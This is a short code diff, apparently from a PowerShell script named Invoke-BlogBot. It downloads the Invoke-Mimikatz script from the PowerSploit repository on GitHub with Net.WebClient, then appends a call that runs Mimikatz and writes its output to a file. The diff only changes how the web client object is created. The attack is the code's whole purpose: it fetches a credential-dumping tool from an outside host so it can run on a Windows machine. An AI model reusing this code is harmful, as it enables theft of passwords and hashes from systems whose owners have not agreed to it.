@@ -240,7 +240,8 @@ Function Invoke-BlogBot {
                 
             [string] $downloadURL = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
             Write-Verbose "I am downloading from $ActualdownloadURL"
-            $downloadedScript = $WebClientObject.downloadString($downloadURL)
+            $wc = new-object Net.WebClient
+            $downloadedScript = $wc.downloadString($downloadURL)
             #append Function call with parameters
             [string] $AppendString = "Invoke-mimikatz > $OutPath"
             $downloadedScript += $AppendString
